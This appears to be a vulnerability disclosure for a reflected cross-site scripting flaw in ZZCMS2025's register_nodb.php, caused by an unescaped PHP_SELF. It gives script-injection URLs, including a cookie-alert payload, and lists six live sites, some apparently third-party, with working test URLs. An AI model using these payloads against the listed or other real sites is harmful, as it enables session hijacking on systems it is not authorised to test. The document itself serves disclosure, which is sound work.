# Cross-Site Scripting (XSS) Vulnerability in ZZCMS register_nodb.php



## Vendor Information

**Official Website**:  http://www.zzcms.net/

**Source Code Download Link**:  http://www.zzcms.net/download/zzcms2025.zip

**Product Version:**  ZZCMS2025



## Vulnerability Analysis



### Source Code Analysis

The file `3/ucenter_api/code/register_nodb.php` was examined and found to contain a form submission.

```php+HTML
if(empty($_POST['submit'])) {
	//注册表单
	echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?example=register">';
	echo '注册:';
	echo '<dl><dt>用户名</dt><dd><input name="username"></dd>';
	echo '<dt>密码</dt><dd><input name="password"></dd>';
	echo '<dt>Email</dt><dd><input name="email"></dd></dl>';
	echo '<input name="submit" type="submit">';
	echo '</form>';
}
```

`$_SERVER['PHP_SELF']` is a controllable variable. It directly echoes user-supplied data on the page without proper filtering or escaping. An attacker can exploit this vulnerability by crafting a malicious URL to execute arbitrary scripts, potentially leading to session hijacking or other malicious actions.



### Request Construction

// Display cookies alert

```http
http://demo.com/3/ucenter_api/code/register_nodb.php/"><script>alert(document.cookie)</script>
```



### Vulnerability Verification

```http
http://hzp.zzcms.net/3/ucenter_api/code/register_nodb.php/%22%3E%3Cscript%3Ealert(%22success%22)%3C/script%3E
```

![image-20250226185444560](/assest/zzcms/xss-register_nodb/xss.png)

### Website Reference

**Note: Actual case examples from cyberspace**

```
http://demo.zzcms.net/3/ucenter_api/code/register_nodb.php/"><script>alert("success")</script>
https://www.88zsw.com/3/ucenter_api/code/register_nodb.php/"><script>alert("success")</script>
http://818yyzs.com/3/ucenter_api/code/register_nodb.php/"><script>alert("success")</script>
http://bjp.zzcms.net/3/ucenter_api/code/register_nodb.php/"><script>alert("success")</script>
http://9.zzcms.net/3/ucenter_api/code/register_nodb.php/"><script>alert("success")</script>
http://hzp.zzcms.net/3/ucenter_api/code/register_nodb.php/"><script>alert("success")</script>
```

